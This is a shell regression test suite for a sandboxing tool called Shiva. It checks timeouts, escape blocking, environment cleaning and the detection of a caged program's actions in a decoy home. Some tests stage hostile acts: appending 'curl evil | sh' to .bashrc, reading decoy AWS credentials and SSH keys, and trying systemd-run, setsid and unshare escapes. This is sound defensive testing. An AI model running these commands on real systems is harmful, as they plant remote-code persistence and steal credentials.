#!/bin/sh
# Regression tests for Shiva. Harmless: every "attack" only tries to touch a
# temporary directory. Run with `make test`.
set -u

SHIVA=${SHIVA:-./shiva}
TMP=$(mktemp -d)
pass=0
fail=0

cleanup() {
	pkill -KILL -f "^/bin/sleep 3[0-9][0-9]$" 2>/dev/null
	rm -rf "$TMP"
}
trap cleanup EXIT

ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { fail=$((fail + 1)); echo "FAIL $1"; }

# expect_exit NAME CODE CMD...
expect_exit() {
	name=$1 want=$2
	shift 2
	"$@" >/dev/null 2>&1
	got=$?
	if [ "$got" -eq "$want" ]; then ok "$name"; else bad "$name (exit $got, want $want)"; fi
}

# still_running PATTERN: true if a process matching PATTERN is alive
still_running() { pgrep -f "$1" >/dev/null; }

expect_exit "runs a program"                0   "$SHIVA" -r /bin/true
expect_exit "passes the exit status"        3   "$SHIVA" -r /bin/sh -c 'exit 3'
expect_exit "reports a missing program"     127 "$SHIVA" -r no-such-program-xyz
expect_exit "needs -r"                      2   "$SHIVA" /bin/true
expect_exit "rejects -t 5abc"               2   "$SHIVA" -t 5abc -r /bin/true
expect_exit "rejects a timeout that overflows" 2 "$SHIVA" -t 4294968 -r /bin/true
expect_exit "timeout kills the target"      124 "$SHIVA" -t 1 -r /bin/sleep 5
expect_exit "denies writes outside the cage" 1  "$SHIVA" -r /usr/bin/touch "$TMP/direct"

# A named UNIX socket outside the cage must be unreachable (D-Bus, ssh-agent, docker...)
if command -v python3 >/dev/null; then
	python3 -c "import socket,sys; s=socket.socket(socket.AF_UNIX); s.bind(sys.argv[1]); s.listen(); import time; time.sleep(5)" "$TMP/sock" &
	srv=$!
	sleep 0.5
	expect_exit "blocks connecting to a UNIX socket" 1 \
		"$SHIVA" -r /usr/bin/python3 -c "import socket,sys; socket.socket(socket.AF_UNIX).connect(sys.argv[1])" "$TMP/sock"
	kill $srv 2>/dev/null
fi

if [ -S "/run/user/$(id -u)/bus" ] && command -v systemd-run >/dev/null; then
	"$SHIVA" -t 5 -r /usr/bin/systemd-run --user --wait --quiet /usr/bin/touch "$TMP/escaped" >/dev/null 2>&1
	if [ -e "$TMP/escaped" ]; then bad "systemd-run escape"; else ok "blocks the systemd-run escape"; fi
fi

out=$(SHIVA_TEST_SECRET=hunter2 "$SHIVA" -r /usr/bin/env 2>/dev/null)
case $out in *hunter2*) bad "environment is cleaned" ;; *) ok "environment is cleaned" ;; esac

# The fake home: the only place the target can write, seeded with decoys.
# It is created under $TMPDIR, so a TMPDIR of our own shows if one is left behind.
export TMPDIR="$TMP/homes"
mkdir "$TMPDIR"
no_home_left() { [ -z "$(ls -A "$TMPDIR")" ]; }
report_of() { "$SHIVA" -r /bin/sh -c "$1" 2>&1 >/dev/null; }

# Where the fake home shows up for the target: over the real home when Shiva
# can use namespaces here, at its own path otherwise. Both are tested as found.
real_home=$(getent passwd "$(id -u)" | cut -d: -f6)
seen_home=$("$SHIVA" -r /bin/sh -c 'echo "$HOME"' 2>/dev/null)
if [ -n "$real_home" ] && [ "$seen_home" = "$real_home" ]; then
	covers=1
	echo "note: the fake home is mounted over $real_home"
else
	covers=0
	echo "note: no namespaces here, the fake home stays at its own path"
fi

case $seen_home in
	"$real_home"|"$TMPDIR"/shiva-*) ok "the target gets a fake home" ;;
	*) bad "the target gets a fake home ($seen_home)" ;;
esac
if no_home_left; then ok "the fake home is deleted afterwards"; else bad "the fake home is deleted afterwards"; fi

expect_exit "the target starts in its home"  0 "$SHIVA" -r /bin/sh -c '[ "$(pwd)" = "$HOME" ]'
expect_exit "the target can write to its home" 0 "$SHIVA" -r /bin/sh -c 'echo x > "$HOME/file" && echo y > "$TMPDIR/file"'
expect_exit "decoys are planted"             0 "$SHIVA" -r /bin/sh -c '[ -s "$HOME/.ssh/id_ed25519" ] && [ -s "$HOME/.aws/credentials" ]'
expect_exit "nothing in the home can be executed" 126 "$SHIVA" -r /bin/sh -c 'cp /bin/true "$HOME/t" && "$HOME/t"'

case $(report_of 'cat "$HOME/.aws/credentials"') in
	*"read "*".aws/credentials"*) ok "reports a decoy that was read" ;;
	*) bad "reports a decoy that was read" ;;
esac
case $(report_of 'echo "curl evil | sh" >> "$HOME/.bashrc"') in
	*"changed "*".bashrc"*) ok "reports a changed startup file" ;;
	*) bad "reports a changed startup file" ;;
esac
case $(report_of 'rm "$HOME/.npmrc"') in
	*"removed "*".npmrc"*) ok "reports a removed decoy" ;;
	*) bad "reports a removed decoy" ;;
esac
case $(report_of 'cp /bin/true "$HOME/tmp/payload"') in
	*"created "*"tmp/payload (executable)"*) ok "reports a dropped executable" ;;
	*) bad "reports a dropped executable" ;;
esac
case $(report_of 'cp "$HOME/.ssh/id_ed25519" "$HOME/tmp/k"') in
	*"tmp/k (copy of ~/.ssh/id_ed25519)"*) ok "reports a copied secret" ;;
	*) bad "reports a copied secret" ;;
esac
case $(report_of 'ls -la "$HOME" "$HOME/.ssh"; . "$HOME/.bashrc"') in
	*"in its fake home"*) bad "a harmless run reports nothing" ;;
	*) ok "a harmless run reports nothing" ;;
esac

# The target may lock the home, or bury files deep in it: it still gets deleted
"$SHIVA" -t 5 -r /bin/sh -c 'mkdir -p a/b; echo x > a/b/f; chmod 000 a/b .ssh; chmod 500 a .
	i=0; cd tmp; while [ $i -lt 2000 ]; do mkdir d && cd d || break; i=$((i + 1)); done' >/dev/null 2>&1
if no_home_left; then ok "a locked, deep home is still deleted"; else bad "a locked, deep home is still deleted"; fi

"$SHIVA" -t 1 -r /bin/sleep 30 >/dev/null 2>&1
if no_home_left; then ok "the home is deleted after a timeout"; else bad "the home is deleted after a timeout"; fi

# With namespaces, a path into the real home leads to the decoys as well
if [ "$covers" -eq 1 ]; then
	case $(report_of "cat '$real_home/.ssh/id_ed25519'") in
		*"read "*".ssh/id_ed25519"*) ok "a hardcoded path into the home reaches a decoy" ;;
		*) bad "a hardcoded path into the home reaches a decoy" ;;
	esac

	# files of ours in the real home: must be invisible, and untouched afterwards
	mine=$(mktemp -d "$real_home/.shiva-test-XXXXXX")
	echo real > "$mine/secret"
	printf '#!/bin/sh\necho changed >> "$0"\nrm -f "$0"\n[ "$HOME" = "%s" ] && [ ! -e "%s/secret" ]\n' "$real_home" "$mine" > "$mine/script"
	chmod +x "$mine/script"
	before=$(cat "$mine/script")

	expect_exit "the real home is hidden"        1 "$SHIVA" -r /bin/cat "$mine/secret"
	expect_exit "runs a program that lives in the real home" 0 "$SHIVA" -r "$mine/script"
	if [ "$(cat "$mine/script" 2>/dev/null)" = "$before" ]; then ok "the target cannot change its own file"; else bad "the target cannot change its own file"; fi
	"$SHIVA" -r /bin/sh -c "echo x > '$real_home/.shiva-test-written'" >/dev/null 2>&1
	if [ ! -e "$real_home/.shiva-test-written" ]; then ok "writes to the home stay in the fake one"; else bad "writes to the home stay in the fake one"; rm -f "$real_home/.shiva-test-written"; fi
	case $("$SHIVA" -r "$mine/script" 2>&1 >/dev/null) in
		*"created"*) bad "the place made for the target is not reported" ;;
		*) ok "the place made for the target is not reported" ;;
	esac
	rm -rf "$mine"
fi

# The target must not build namespaces of its own (it would be root in them)
if command -v unshare >/dev/null; then
	expect_exit "blocks new user namespaces"     1 "$SHIVA" -r "$(command -v unshare)" -U /bin/true
	expect_exit "blocks new network namespaces"  1 "$SHIVA" -r "$(command -v unshare)" -n /bin/true
fi
expect_exit "fork and threads still work"    0 "$SHIVA" -r /bin/sh -c '(exit 0) && /bin/true | /bin/true'

# A program given as ./name still runs, although the target starts elsewhere
cp /bin/true "$TMP/sample"
shiva_abs=$(command -v "$SHIVA")
case $shiva_abs in /*) ;; *) shiva_abs=$PWD/$shiva_abs ;; esac
(cd "$TMP" && "$shiva_abs" -r ./sample) >/dev/null 2>&1
if [ $? -eq 0 ]; then ok "runs ./program from the current folder"; else bad "runs ./program from the current folder"; fi

# Nothing caged may outlive Shiva
"$SHIVA" -r /bin/sh -c '/bin/sleep 301 &' >/dev/null 2>&1
if still_running "^/bin/sleep 301$"; then bad "kills background children on exit"; else ok "kills background children on exit"; fi

"$SHIVA" -t 1 -r /bin/sh -c 'setsid /bin/sleep 302 & /bin/sleep 30' >/dev/null 2>&1
if still_running "^/bin/sleep 302$"; then bad "timeout kills setsid() escapees"; else ok "timeout kills setsid() escapees"; fi

"$SHIVA" -t 60 -r /bin/sleep 303 >/dev/null 2>&1 &
sp=$!
sleep 0.5
kill -TERM $sp
wait $sp
got=$?
sleep 0.2
if [ "$got" -eq 143 ] && ! still_running "^/bin/sleep 303$"; then
	ok "SIGTERM to shiva kills the target"
else
	bad "SIGTERM to shiva kills the target (exit $got)"
fi

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
